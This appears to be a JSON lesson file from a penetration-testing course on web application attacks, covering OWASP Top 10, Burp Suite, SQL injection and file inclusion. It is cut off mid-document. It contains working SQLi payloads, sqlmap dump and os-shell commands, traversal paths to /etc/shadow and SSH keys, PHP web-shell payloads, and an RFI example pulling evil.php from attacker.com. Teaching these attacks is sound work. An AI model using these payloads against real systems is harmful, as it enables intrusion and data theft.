{
  "lesson_id": "b2c3d4e5-f6a7-4b89-9c0d-1e2f3a4b5c6d",
  "domain": "pentest",
  "title": "Web Application Penetration Testing Fundamentals",
  "subtitle": "OWASP Top 10, Burp Suite, and common web vulnerabilities",
  "difficulty": 2,
  "estimated_time": 55,
  "order_index": 5,
  "prerequisites": [],
  "concepts": [
    "OWASP Top 10",
    "Burp Suite",
    "SQL Injection",
    "XSS",
    "Directory Traversal",
    "File Inclusion",
    "IDOR",
    "CSRF"
  ],
  "learning_objectives": [
    "Understand the OWASP Top 10 web vulnerabilities and their impact",
    "Master Burp Suite for intercepting and manipulating HTTP traffic",
    "Identify and exploit common web application vulnerabilities",
    "Perform web application reconnaissance and enumeration"
  ],
  "content_blocks": [
    {
      "block_id": "c3d4e5f6-a7b8-4c90-9d0e-1f2a3b4c5d6e",
      "type": "mindset_coach",
      "title": "The Web Application Attack Surface",
      "content": {
        "text": "**Welcome to web application pentesting - the #1 attack vector!**\n\nYou're about to learn the most in-demand penetration testing skill. In 2023, web applications accounted for 43% of all data breaches (Verizon DBIR). Every company has a web presence, which means endless opportunities for both attackers and defenders.\n\n**Here's the truth**: Web applications are complex - they have databases, APIs, authentication, business logic, and third-party integrations. Each component is a potential vulnerability. A single SQL injection can expose millions of customer records.\n\n**The Jim Kwik principle at work**: We'll use ACTIVE LEARNING - you won't just read about XSS, you'll see real attack payloads and understand why they work. We'll CONNECT TO WHAT YOU KNOW - you use web apps daily, now you'll see them through an attacker's eyes.\n\n**Why this matters**: The 2017 Equifax breach (147 million records) was a web app vulnerability. The 2021 T-Mobile breach (54 million records) was an API vulnerability. Your ability to find and exploit web vulnerabilities can prevent catastrophic breaches.\n\n**Your goal for this lesson**: Master web application security testing so thoroughly that when you see a login form, you instinctively think of SQL injection, when you see a search box, you think XSS, and when you see a URL parameter, you think injection vectors."
      }
    },
    {
      "block_id": "d4e5f6a7-b8c9-4d01-9e0f-1a2b3c4d5e6f",
      "type": "explanation",
      "title": "OWASP Top 10: The Web Security Foundation",
      "content": {
        "text": "## What is OWASP Top 10?\n\n**OWASP (Open Web Application Security Project)** publishes the Top 10 most critical web application security risks every few years.\n\n**Why it matters**: \n- Industry standard for web security\n- Referenced in compliance requirements (PCI DSS, HIPAA)\n- Focus areas for penetration testing\n- Training baseline for developers\n\n## OWASP Top 10 (2021 Edition)\n\n### 1. Broken Access Control\n**Risk**: Users can access data/functions they shouldn't\n\n**Examples**:\n- **IDOR (Insecure Direct Object Reference)**: Changing URL parameter to access other users' data\n```\nhttps://bank.com/account?id=12345  ← Your account\nhttps://bank.com/account?id=12346  ← Someone else's account (if no check!)\n```\n- **Path Traversal**: Accessing files outside intended directory\n```\nhttps://example.com/file?name=report.pdf\nhttps://example.com/file?name=../../../../etc/passwd\n```\n- **Missing Function Level Access Control**: Accessing admin functions without admin role\n```\nhttps://example.com/admin/delete_user  ← Should check if user is admin!\n```\n\n**Real-world impact**: 2019 Facebook bug let anyone view private photos of 6.8 million users.\n\n### 2. Cryptographic Failures\n**Risk**: Sensitive data exposed due to weak/missing encryption\n\n**Examples**:\n- Storing passwords in plaintext\n- Using weak hashing (MD5, SHA-1 without salt)\n- Transmitting sensitive data over HTTP (not HTTPS)\n- Hardcoded encryption keys in source code\n- Weak TLS configuration (SSLv3, TLS 1.0)\n\n**Testing**:\n```bash\n# Check TLS configuration\nsslscan example.com\ntestssl.sh example.com\n\n# Check for HTTP (not HTTPS) sensitive pages\ncurl -I http://example.com/login\n```\n\n**Real-world impact**: 2013 Adobe breach exposed 150 million passwords encrypted with weak algorithm.\n\n### 3. Injection\n**Risk**: Untrusted data sent to interpreter as command/query\n\n**Types**:\n- **SQL Injection**: Injecting SQL commands into input\n```sql\nSELECT * FROM users WHERE username='admin' OR '1'='1'--' AND password='x'\n```\n- **OS Command Injection**: Injecting system commands\n```bash\nping 8.8.8.8; cat /etc/passwd\n```\n- **LDAP Injection**: Injecting LDAP queries\n- **XML Injection**: Injecting malicious XML\n\n**Test**:\n```bash\n# SQL injection test payloads\n' OR '1'='1\n' OR 1=1--\nadmin'--\n' UNION SELECT NULL--\n\n# Command injection test\n; ls -la\n| whoami\n`id`\n$(cat /etc/passwd)\n```\n\n**Real-world impact**: SQL injection is still #1 web attack vector despite being known for 20+ years.\n\n### 4. Insecure Design\n**Risk**: Missing security controls in design phase\n\n**Examples**:\n- No rate limiting (brute force possible)\n- Missing abuse case testing\n- Insecure business logic (e.g., negative quantities in shopping cart)\n- No security requirements during development\n\n**Business logic flaw example**:\n```\nOriginal price: $100\nDiscount: 10%\nFinal price: $90\n\nAttacker changes discount parameter:\nDiscount: 150%  ← No validation!\nFinal price: -$50  ← Website pays attacker!\n```bash\n\n### 5. Security Misconfiguration\n**Risk**: Insecure default configurations, incomplete configs\n\n**Examples**:\n- Default credentials (admin/admin)\n- Unnecessary features enabled\n- Detailed error messages showing stack traces\n- Directory listing enabled\n- Missing security headers\n- Outdated software\n\n**Testing**:\n```bash\n# Check for directory listing\ncurl https://example.com/uploads/\n\n# Check security headers\ncurl -I https://example.com | grep -E \"X-Frame-Options|X-Content-Type-Options|Strict-Transport-Security\"\n\n# Check for default files\ngobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt\n```\n\n**Common misconfigurations**:\n- `/admin` accessible without auth\n- `/phpinfo.php` exposing config\n- `.git` directory exposed\n- AWS S3 buckets set to public\n\n### 6. Vulnerable and Outdated Components\n**Risk**: Using components with known vulnerabilities\n\n**Examples**:\n- Outdated WordPress plugins\n- Vulnerable JavaScript libraries (jQuery, AngularJS)\n- Old Apache Struts (Equifax breach)\n- Unpatched web servers\n\n**Testing**:\n```bash\n# Identify technologies\nwhatweb https://example.com\nwappalyzer\n\n# Check for known CVEs\nsearchsploit apache 2.4.29\nnmap --script vuln example.com\n```\n\n**Real-world impact**: 2017 Equifax breach (Apache Struts CVE-2017-5638) exposed 147 million records.\n\n### 7. Identification and Authentication Failures\n**Risk**: Weak authentication allows account takeover\n\n**Examples**:\n- Weak password policies\n- No MFA (multi-factor authentication)\n- Session fixation\n- Predictable session tokens\n- Credential stuffing not prevented\n- Password reset flaws\n\n**Testing**:\n```bash\n# Test for weak passwords\nhydra -l admin -P passwords.txt example.com http-post-form \"/login:username=^USER^&password=^PASS^:F=Invalid\"\n\n# Check session token entropy\n# Generate multiple sessions, analyze randomness\n\n# Test password reset\n# Try to reset other users' passwords\n```\n\n**Session management flaws**:\n```bash\n# Session in URL (bad!)\nhttps://example.com/dashboard?session=abc123\n\n# Session not invalidated on logout\n# Re-using old session token still works\n```bash\n\n### 8. Software and Data Integrity Failures\n**Risk**: Code/infrastructure assume updates/data from untrusted sources\n\n**Examples**:\n- Using CDN without SRI (Subresource Integrity)\n```html\n<!-- Vulnerable: No integrity check -->\n<script src=\"https://cdn.example.com/jquery.js\"></script>\n\n<!-- Secure: SRI ensures integrity -->\n<script src=\"https://cdn.example.com/jquery.js\" \nintegrity=\"sha384-abc123...\"\ncrossorigin=\"anonymous\"></script>\n```\n- Insecure deserialization\n- Auto-update without verification\n- CI/CD pipeline compromise (SolarWinds)\n\n**Real-world impact**: 2020 SolarWinds supply chain attack compromised 18,000+ organizations.\n\n### 9. Security Logging and Monitoring Failures\n**Risk**: Breaches go undetected for months\n\n**Examples**:\n- No logging of authentication attempts\n- Logs not monitored\n- Insufficient log detail\n- No alerting on suspicious activity\n\n**Statistics**: Average time to detect breach is 207 days (IBM 2023).\n\n**What to log**:\n- Failed login attempts\n- Successful authentication\n- Privilege changes\n- Input validation failures\n- Access to sensitive data\n\n### 10. Server-Side Request Forgery (SSRF)\n**Risk**: Application fetches remote resource without validating URL\n\n**Example**:\n```php\n# Vulnerable code\n$url = $_GET['url'];\n$content = file_get_contents($url);  // No validation!\n\n# Attack\nhttps://example.com/fetch?url=http://localhost:22  ← Scan internal ports\nhttps://example.com/fetch?url=http://169.254.169.254/latest/meta-data/  ← AWS metadata\nhttps://example.com/fetch?url=file:///etc/passwd  ← Read local files\n```\n\n**Real-world impact**: 2019 Capital One breach used SSRF to access AWS metadata and steal 100 million records.\n\n## OWASP Top 10 Memory Aid\n\n**\"**B**roken **C**rypto **I**njection **I**nsecure **S**ecurity **V**ulnerable **I**dentification **S**oftware **S**ecurity **S**SRF\"**\n\n1. **B**roken Access Control\n2. **C**ryptographic Failures  \n3. **I**njection\n4. **I**nsecure Design\n5. **S**ecurity Misconfiguration\n6. **V**ulnerable Components\n7. **I**dentification Failures\n8. **S**oftware Integrity\n9. **S**ecurity Logging\n10. **S**SRF\n\nOr remember: **\"Top 3 are BCI\"** (Broken access, Crypto, Injection) - these cause most breaches."
      }
    },
    {
      "block_id": "e5f6a7b8-c9d0-4e12-9f0a-1b2c3d4e5f6a",
      "type": "explanation",
      "title": "Burp Suite: The Web Pentester's Swiss Army Knife",
      "content": {
        "text": "## What is Burp Suite?\n\n**Burp Suite** is an integrated platform for web application security testing.\n\n**Editions**:\n- **Community (Free)**: Core features, rate-limited scanner\n- **Professional ($399/year)**: Full scanner, advanced tools\n- **Enterprise**: Automated scanning for CI/CD\n\n**Core features**:\n- Proxy (intercept HTTP/HTTPS traffic)\n- Repeater (modify and resend requests)\n- Intruder (automated attacks)\n- Scanner (vulnerability scanner - Pro only)\n- Sequencer (analyze randomness)\n- Decoder (encode/decode data)\n\n## Setting Up Burp Suite\n\n**Step 1: Start Burp**\n```bash\n# On Kali Linux\nburpsuite\n\n# Create temporary project, use Burp defaults\n```\n\n**Step 2: Configure Browser Proxy**\n\nBurp listens on `127.0.0.1:8080` by default.\n\n**Firefox** (recommended for testing):\n```\nSettings → Network Settings → Manual proxy configuration\nHTTP Proxy: 127.0.0.1\nPort: 8080\n☑ Also use this proxy for HTTPS\n```\n\n**Or use FoxyProxy extension**:\n- Install FoxyProxy\n- Add proxy: 127.0.0.1:8080\n- Toggle on/off easily\n\n**Step 3: Install Burp CA Certificate**\n\nTo intercept HTTPS, install Burp's CA certificate:\n\n1. With proxy enabled, visit: `http://burp`\n2. Click \"CA Certificate\" (downloads `cacert.der`)\n3. Firefox → Settings → Privacy & Security → Certificates → View Certificates\n4. Import → Select `cacert.der` → Trust for websites\n\n**Now you can intercept HTTPS!**\n\n## Burp Proxy: Intercepting Traffic\n\n**Intercept tab**:\n- **Intercept is on**: Pauses requests for inspection/modification\n- **Intercept is off**: Traffic flows normally (still logged)\n\n**Example intercepted request**:\n```http\nPOST /login HTTP/1.1\nHost: example.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 35\n\nusername=admin&password=test123\n```\n\n**Actions**:\n- **Forward**: Send request as-is\n- **Drop**: Discard request\n- **Action → Send to Repeater**: Send to Repeater tab for analysis\n- **Action → Send to Intruder**: Send to Intruder for automated attacks\n- **Edit**: Modify request before forwarding\n\n**HTTP History tab**:\n- Shows all requests/responses\n- Filter by domain, status code, file type\n- Right-click → Send to Repeater/Intruder\n\n## Burp Repeater: Manual Testing\n\n**Purpose**: Manually modify and resend requests to test for vulnerabilities.\n\n**Workflow**:\n1. Intercept request or select from HTTP History\n2. Send to Repeater (Ctrl+R)\n3. Modify request parameters\n4. Click \"Send\"\n5. Analyze response\n6. Repeat with different payloads\n\n**Testing SQL injection in Repeater**:\n\n**Original request**:\n```http\nGET /product?id=1 HTTP/1.1\nHost: example.com\n```\n\n**Modified requests** (test in Repeater):\n```http\nGET /product?id=1' HTTP/1.1\n# Response: SQL syntax error → Vulnerable!\n\nGET /product?id=1' OR '1'='1 HTTP/1.1\n# Response: Returns all products → Confirmed SQLi\n\nGET /product?id=1' UNION SELECT NULL-- HTTP/1.1\n# Test number of columns\n\nGET /product?id=1' UNION SELECT username,password FROM users-- HTTP/1.1\n# Extract data\n```\n\n**Repeater tips**:\n- Use tabs for multiple requests\n- Compare responses (Comparer tool)\n- Save interesting requests\n- Use Ctrl+Space for shortcuts\n\n## Burp Intruder: Automated Attacks\n\n**Purpose**: Automate parameter fuzzing, brute forcing, etc.\n\n**Attack types**:\n- **Sniper**: One payload position, iterate through wordlist\n- **Battering ram**: Multiple positions, same payload\n- **Pitchfork**: Multiple positions, parallel wordlists\n- **Cluster bomb**: Multiple positions, all combinations\n\n### Example: Fuzzing for SQLi\n\n**Step 1**: Send request to Intruder\n```http\nGET /product?id=1 HTTP/1.1\nHost: example.com\n```\n\n**Step 2**: Set payload position\n```http\nGET /product?id=§1§ HTTP/1.1\n```\n(§ marks injection point)\n\n**Step 3**: Load payload list\n```\nPayloads tab → Payload Options\n→ Load list: /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt\n```\n\n**Step 4**: Start attack\n- Click \"Start attack\"\n- Analyze responses:\n- Length differences\n- Status codes\n- Error messages\n- Response times\n\n**Step 5**: Identify vulnerabilities\n- Look for SQL errors\n- Different response lengths\n- Unexpected behavior\n\n### Example: Username Enumeration\n\n**Request**:\n```http\nPOST /login HTTP/1.1\n\nusername=§admin§&password=test\n```\n\n**Payload**: Username wordlist\n\n**Analysis**:\n- User exists: \"Invalid password\" (response length 1250)\n- User doesn't exist: \"Invalid username\" (response length 1230)\n\n→ Different responses = Username enumeration vulnerability!\n\n## Burp Decoder\n\n**Purpose**: Encode/decode data in various formats.\n\n**Supported formats**:\n- URL encoding (%20, %3D)\n- HTML entities (&lt;, &gt;)\n- Base64\n- Hex\n- ASCII\n- Hashing (MD5, SHA-1, SHA-256)\n\n**Use cases**:\n- Decode Base64 session tokens\n- URL encode payloads\n- Identify hash types\n\n**Example**:\n```\nInput: admin:password\nBase64: YWRtaW46cGFzc3dvcmQ=\nURL encode: admin%3Apassword\nMD5: 5f4dcc3b5aa765d61d8327deb882cf99\n```bash\n\n## Burp Sequencer\n\n**Purpose**: Analyze randomness of tokens (session IDs, CSRF tokens).\n\n**Why it matters**: Predictable tokens = session hijacking possible.\n\n**How to use**:\n1. Capture request that returns token\n2. Send to Sequencer\n3. Select token location\n4. Generate 20,000+ samples\n5. Analyze entropy\n\n**Results**:\n- **Good**: High entropy, unpredictable\n- **Bad**: Low entropy, predictable pattern\n\n## Burp Comparer\n\n**Purpose**: Compare two requests/responses to find differences.\n\n**Use cases**:\n- Compare SQL injection responses\n- Identify enumeration vectors\n- Diff responses for timing attacks\n\n**Types**:\n- Words (highlights different words)\n- Bytes (highlights different bytes)\n\n## Web Application Testing Workflow with Burp\n\n**Phase 1: Mapping**\n```\n1. Browse entire application with Burp proxy enabled\n2. Review Site map (Target → Site map)\n3. Identify:\n- Login/authentication\n- Input fields\n- File uploads\n- APIs\n- Admin panels\n```\n\n**Phase 2: Analysis**\n```\n1. Review HTTP history\n2. Identify interesting parameters:\n- id, user_id, file, page\n- Cookies, headers\n- Hidden form fields\n3. Send to Repeater for manual testing\n```\n\n**Phase 3: Exploitation**\n```\n1. Test for:\n- SQL injection (Repeater/Intruder)\n- XSS (Repeater)\n- IDOR (Repeater)\n- File inclusion (Intruder)\n2. Document vulnerabilities\n3. Proof of concept\n```\n\n**Phase 4: Scanning** (Pro only)\n```\n1. Run automated scan\n2. Review findings\n3. Validate false positives\n4. Export report\n```bash\n\n## Burp Extensions\n\nBurp has 500+ community extensions:\n\n**Top extensions**:\n- **Logger++**: Enhanced logging\n- **Autorize**: Automated authorization testing\n- **Param Miner**: Find hidden parameters\n- **Upload Scanner**: Test file upload bypasses\n- **JWT Editor**: Manipulate JWT tokens\n- **Turbo Intruder**: Faster than Intruder\n\n**Install extensions**:\n```\nExtender → BApp Store → Browse & Install\n```bash\n\n## Burp Suite Alternatives\n\n- **OWASP ZAP** (Free, open source, similar to Burp)\n- **Caido** (Modern, fast, cheaper than Burp Pro)\n- **mitmproxy** (CLI proxy, scriptable)\n\n**When to use what**:\n- **Burp Pro**: Professional pentesting\n- **Burp Community**: Learning, bug bounties\n- **ZAP**: Free alternative, automation\n- **mitmproxy**: Scripting, CLI workflows"
      }
    },
    {
      "block_id": "f6a7b8c9-d0e1-4f23-9a0b-1c2d3e4f5a6b",
      "type": "explanation",
      "title": "SQL Injection: The King of Web Vulnerabilities",
      "content": {
        "text": "## What is SQL Injection?\n\n**SQL Injection (SQLi)** is injecting malicious SQL code into application queries.\n\n**Vulnerable code example** (PHP):\n```php\n$username = $_POST['username'];\n$password = $_POST['password'];\n\n// Vulnerable: User input directly in query\n$query = \"SELECT * FROM users WHERE username='$username' AND password='$password'\";\n$result = mysqli_query($conn, $query);\n\nif(mysqli_num_rows($result) > 0) {\necho \"Login successful!\";\n}\n```\n\n**Normal login**:\n```sql\nSELECT * FROM users WHERE username='admin' AND password='password123'\n```\n\n**SQL injection attack**:\n```\nUsername: admin' OR '1'='1'--\nPassword: anything\n\nResulting query:\nSELECT * FROM users WHERE username='admin' OR '1'='1'--' AND password='anything'\n```\n\n**What happens**:\n- `'1'='1'` is always true\n- `--` comments out the rest (password check bypassed!)\n- Query returns admin user → Login successful\n\n## SQL Injection Types\n\n### 1. Error-Based SQLi\nDatabase errors reveal information.\n\n**Test payload**:\n```sql\n' OR 1=1--\n' OR 'a'='a\n```\n\n**Response**:\n```\nSQL syntax error near \"' OR 1=1--'\"\nYou have an error in your SQL syntax near...\n```\n\n→ Application is vulnerable!\n\n### 2. UNION-Based SQLi\nUse UNION to extract data from other tables.\n\n**Requirements**: \n- Know number of columns\n- Know column data types\n\n**Step 1: Find number of columns**\n```sql\n' ORDER BY 1--  ✓ (works)\n' ORDER BY 2--  ✓ (works)\n' ORDER BY 3--  ✓ (works)\n' ORDER BY 4--  ✗ (error - only 3 columns)\n```\n\n**Step 2: Identify column types**\n```sql\n' UNION SELECT NULL,NULL,NULL--  ✓ (works - 3 NULL columns)\n' UNION SELECT 'a','b','c'--     ✓ (string columns)\n```\n\n**Step 3: Extract data**\n```sql\n# Get database version\n' UNION SELECT @@version,NULL,NULL--\n\n# Get current database\n' UNION SELECT database(),NULL,NULL--\n\n# Get table names\n' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--\n\n# Get column names\n' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--\n\n# Extract data\n' UNION SELECT username,password,email FROM users--\n```\n\n**Output**:\n```\nUsername: admin\nPassword: 5f4dcc3b5aa765d61d8327deb882cf99 (MD5 hash)\nEmail: admin@example.com\n```bash\n\n### 3. Blind SQLi (Boolean-Based)\nNo direct output, but behavior changes based on query result.\n\n**Test**:\n```sql\n' AND 1=1--  → Page loads normally (TRUE)\n' AND 1=2--  → Page behaves differently (FALSE)\n```\n\n**Extract data character by character**:\n```sql\n# Is first character of admin password 'a'?\n' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--\n→ FALSE (page behaves one way)\n\n# Is first character 'b'?\n' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='b'--\n→ FALSE\n\n# Is first character 'p'?\n' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='p'--\n→ TRUE (page behaves normal way)\n\n# First character is 'p', repeat for each character...\n```\n\nThis is automated with tools like SQLMap.\n\n### 4. Time-Based Blind SQLi\nNo visible difference, but response time changes.\n\n**Test**:\n```sql\n# MySQL\n' AND SLEEP(5)--  → Response takes 5 seconds\n\n# PostgreSQL  \n' AND pg_sleep(5)--\n\n# MSSQL\n'; WAITFOR DELAY '00:00:05'--\n```\n\n**Extract data**:\n```sql\n# If first character is 'p', sleep 5 seconds\n' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='p', SLEEP(5), 0)--\n```\n\n→ If response takes 5 seconds, first character is 'p'\n\n## SQL Injection Cheat Sheet\n\n### Comments\n```sql\n--        (MySQL, MSSQL, PostgreSQL)\n#         (MySQL)\n/**/      (All databases)\n```bash\n\n### Authentication Bypass\n```sql\nadmin' OR '1'='1'--\nadmin' OR 1=1--\n' OR 'a'='a\n' OR ''='\nadmin'--\n' OR 1=1#\n```bash\n\n### UNION Injection\n```sql\n' UNION SELECT NULL--\n' UNION SELECT NULL,NULL--\n' UNION SELECT NULL,NULL,NULL--\n' UNION SELECT 1,2,3--\n' UNION SELECT @@version,NULL,NULL--\n' UNION SELECT table_name FROM information_schema.tables--\n```bash\n\n### Information Gathering\n```sql\n# MySQL\n@@version          (version)\ndatabase()         (current database)\nuser()             (current user)\n\n# PostgreSQL\nversion()\ncurrent_database()\ncurrent_user\n\n# MSSQL\n@@version\nDB_NAME()\nUSER_NAME()\n\n# Oracle\nBanner FROM v$version\nSYS.DATABASE_NAME FROM dual\n```bash\n\n### Data Extraction\n```sql\n# List tables\nSELECT table_name FROM information_schema.tables\n\n# List columns\nSELECT column_name FROM information_schema.columns WHERE table_name='users'\n\n# Extract data\nSELECT username,password FROM users\n\n# Concatenate results\nSELECT CONCAT(username,':',password) FROM users\n```bash\n\n## SQLMap: Automated SQL Injection\n\n**SQLMap** automates SQLi detection and exploitation.\n\n**Basic usage**:\n```bash\n# Test URL parameter\nsqlmap -u \"http://example.com/product?id=1\"\n\n# Test POST request\nsqlmap -u \"http://example.com/login\" --data=\"username=admin&password=test\"\n\n# Use intercepted request from Burp\n# Save request to file: request.txt\nsqlmap -r request.txt\n\n# Test specific parameter\nsqlmap -u \"http://example.com/search\" --data=\"query=test&category=all\" -p query\n```\n\n**Enumeration**:\n```bash\n# Get databases\nsqlmap -u \"http://example.com/product?id=1\" --dbs\n\n# Get tables in database\nsqlmap -u \"http://example.com/product?id=1\" -D dbname --tables\n\n# Get columns\nsqlmap -u \"http://example.com/product?id=1\" -D dbname -T users --columns\n\n# Dump data\nsqlmap -u \"http://example.com/product?id=1\" -D dbname -T users --dump\n\n# Dump everything\nsqlmap -u \"http://example.com/product?id=1\" --dump-all\n```\n\n**Advanced options**:\n```bash\n# Use authentication\nsqlmap -u \"http://example.com/product?id=1\" --cookie=\"PHPSESSID=abc123\"\n\n# OS shell (if db has file write permissions)\nsqlmap -u \"http://example.com/product?id=1\" --os-shell\n\n# Read file\nsqlmap -u \"http://example.com/product?id=1\" --file-read=\"/etc/passwd\"\n\n# Specify DBMS (faster)\nsqlmap -u \"http://example.com/product?id=1\" --dbms=mysql\n\n# Aggressive testing\nsqlmap -u \"http://example.com/product?id=1\" --level=5 --risk=3\n```\n\n**Output example**:\n```\n[INFO] testing 'MySQL >= 5.0 AND error-based'\n[INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based' injectable\n\navailable databases [3]:\n[*] information_schema\n[*] mysql\n[*] webapp\n\nDatabase: webapp\n+----+----------+----------------------------------+\n| id | username | password                         |\n+----+----------+----------------------------------+\n| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |\n| 2  | user     | 482c811da5d5b4bc6d497ffa98491e38 |\n+----+----------+----------------------------------+\n```bash\n\n## Preventing SQL Injection\n\n**Secure code** (prepared statements):\n```php\n// Use prepared statements (parameterized queries)\n$stmt = $conn->prepare(\"SELECT * FROM users WHERE username=? AND password=?\");\n$stmt->bind_param(\"ss\", $username, $password);\n$stmt->execute();\n$result = $stmt->get_result();\n```\n\n**Why this works**: \n- User input treated as DATA, not CODE\n- Database knows `?` is a parameter, not SQL syntax\n- Injection impossible\n\n**Other defenses**:\n- Input validation (whitelist allowed characters)\n- Least privilege (database user shouldn't be admin)\n- WAF (Web Application Firewall)\n- Regular security testing"
      }
    },
    {
      "block_id": "a7b8c9d0-e1f2-4a34-9b0c-1d2e3f4a5b6c",
      "type": "real_world",
      "title": "Directory Traversal and File Inclusion Attacks",
      "content": {
        "text": "## Directory Traversal (Path Traversal)\n\n**Definition**: Accessing files outside the web root directory.\n\n**Vulnerable code** (PHP):\n```php\n$file = $_GET['file'];\ninclude(\"/var/www/documents/\" . $file);\n```\n\n**Normal usage**:\n```\nhttp://example.com/page?file=report.pdf\n→ Loads /var/www/documents/report.pdf\n```\n\n**Attack**:\n```\nhttp://example.com/page?file=../../../../etc/passwd\n→ Loads /var/www/documents/../../../../etc/passwd\n→ Resolves to /etc/passwd\n```\n\n**Directory traversal sequences**:\n```\n../          (parent directory)\n..\\          (Windows)\n....//       (bypass filters)\n..;/         (bypass filters)\n%2e%2e%2f    (URL encoded ../)\n%252e%252e%252f  (double URL encoded)\n```\n\n**Common files to target**:\n\n**Linux**:\n```\n/etc/passwd        (user list)\n/etc/shadow        (password hashes - requires root)\n/etc/hosts         (hostname mappings)\n/etc/apache2/apache2.conf  (web server config)\n/var/log/apache2/access.log  (access logs)\n/home/user/.ssh/id_rsa  (SSH private keys)\n/root/.bash_history  (command history)\n```\n\n**Windows**:\n```\nC:\\Windows\\System32\\drivers\\etc\\hosts\nC:\\Windows\\win.ini\nC:\\boot.ini\nC:\\inetpub\\wwwroot\\web.config  (IIS config)\nC:\\xampp\\htdocs\\config.php  (app config)\n```\n\n**Testing**:\n```bash\n# Manual testing\ncurl \"http://example.com/page?file=../../../../etc/passwd\"\n\n# With Burp Intruder\n# Payload position: file=§../../../../etc/passwd§\n# Payloads:\n../../../../etc/passwd\n../../../etc/passwd\n../../etc/passwd\n....//....//....//etc/passwd\n..././..././..././etc/passwd\n```bash\n\n## Local File Inclusion (LFI)\n\n**Definition**: Including local files in application code execution.\n\n**Vulnerable code** (PHP):\n```php\n$page = $_GET['page'];\ninclude($page . \".php\");\n```\n\n**Attack vectors**:\n\n### 1. PHP Wrapper - Data://\n```\nhttp://example.com/page?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2BCg==\n\nDecodes to: <?php system($_GET['cmd']); ?>\n```bash\n\n### 2. PHP Wrapper - php://filter\n```bash\n# Read source code (base64 encoded)\nhttp://example.com/page?page=php://filter/convert.base64-encode/resource=index.php\n\n# Output: PD9waHAgLy8gc291cmNlIGNvZGUgaGVyZQ== (base64 of source)\n```bash\n\n### 3. Log Poisoning\nInject code into logs, then include log file.\n\n**Step 1**: Poison log\n```bash\n# Inject PHP code into User-Agent\ncurl -A \"<?php system($_GET['cmd']); ?>\" http://example.com/\n```\n\n**Step 2**: Include log file\n```\nhttp://example.com/page?page=../../../../var/log/apache2/access.log&cmd=whoami\n```\n\n**Result**: Log file executed as PHP, runs `whoami` command.\n\n### 4. Session File Inclusion\nPHP stores sessions in `/var/lib/php/sessions/sess_[SESSIONID]`\n\n**Step 1**: Poison session\n```\nPOST /login\nusername=<?php system($_GET['cmd']); ?>&password=test\n```\n\n**Step 2**: Include session file\n```\nhttp://example.com/page?page=../../../../var/lib/php/sessions/sess_abc123&cmd=id\n```bash\n\n## Remote File Inclusion (RFI)\n\n**Definition**: Including remote files from attacker-controlled server.\n\n**Vulnerable code**:\n```php\n$file = $_GET['file'];\ninclude($file);\n```\n\n**Attack**:\n\n**Step 1**: Host malicious PHP file\n```php\n# evil.php on attacker server\n<?php\nsystem($_GET['cmd']);\n?>\n```\n\n**Step 2**: Include remote file\n```\nhttp://example.com/page?file=http://attacker.com/evil.php&cmd=whoami\n```\n\n**Requirements**:\n- `allow_url_include = On` in php.ini (usually disabled)\n- `allow_url_fopen = On` (usually enabled)\n\n**Testing**:\n```bash\n# Test with hosted file\ncurl \"http://example.com/page?file=http://attacker.com/test.txt\"\n\n# Test with Burp Collaborator\nhttp://example.com/page?file=http://burpcollaborator.net/test\n```bash\n\n## File Inclusion to RCE (Remote Code Execution)\n\n### Method 1: /proc/self/environ\nInclude environment variables containing injected code.\n\n```bash\n# Inject code into User-Agent\ncurl -A \"<?php system('id'); ?>\" http://example.com/\n\n# Include environ\nhttp://example.com/page?file=../../../../proc/self/environ\n```bash\n\n### Method 2: PHP Session Upload Progress\nUpload file with PHP code in filename.\n\n```python\nimport requests\n\n# Upload file with malicious filename\nfiles = {'file': ('<?php system(\"id\"); ?>.jpg', 'test')}\nrequests.post('http://example.com/upload.php', files=files)\n\n# Include session\nrequests.get('http://example.com/page?file=/var/lib/php/sessions/sess_abc123')\n```bash\n\n### Method 3: PHP zip:// wrapper\nCreate ZIP with PHP code, upload, include.\n\n```bash\n# Create malicious ZIP\necho \"<?php system('id'); ?>\" > shell.php\nzip shell.zip shell.php\n\n# Upload shell.zip\ncurl -F \"file=@shell.zip\" http://example.com/upload.php\n\n# Include via zip wrapper\nhttp://example.com/page?file=zip://uploads/shell.zip%23shell.php\n```bash\n\n## LFI/RFI Testing Checklist\n\n**1. Identify file parameter**\n```\n?file=\n?page=\n?include=\n?doc=\n?document=\n?folder=\n?path=\n?style=\n?template=\n?lang=\n```\n\n**2. Test for directory traversal**\n```\n../../../../etc/passwd\n....//....//etc/passwd\n..%2F..%2F..%2Fetc%2Fpasswd\n```\n\n**3. Test for LFI**\n```\nphp://filter/convert.base64-encode/resource=index.php\ndata://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+Cg==\n```\n\n**4. Test for RFI**\n```\nhttp://attacker.com/shell.txt\nhttp://burpcollaborator.net/test\n```\n\n**5. Automated testing**\n```bash\n# With Burp Intruder\n# Payload list: LFI/RFI wordlist\n\n# With wfuzz\nwfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt http://example.com/page?file=FUZZ\n```bash\n\n## Defense\n\n**Secure code**:\n```php\n# Whitelist allowed files\n$allowed_files = ['report', 'dashboard', 'profile'];\n$file = $_GET['file'];\n\nif (in_array($file, $allowed_files)) {\ninclude($file . \".php\");\n} else {\ndie(\"Invalid file\");\n}\n\n# Or use basename() to strip path\n$file = basename($_GET['file']);\ninclude(\"/var/www/pages/\" . $file);\n```\n\n**Additional protections**:\n- Disable dangerous PHP functions: `allow_url_include`, `allow_url_fopen`\n- Use `open_basedir` restriction\n- Input validation (reject `../`, `..\\`, etc.)\n- Never use user input directly in `include()`, `require()`, `file_get_contents()`"
      }
    },
    {
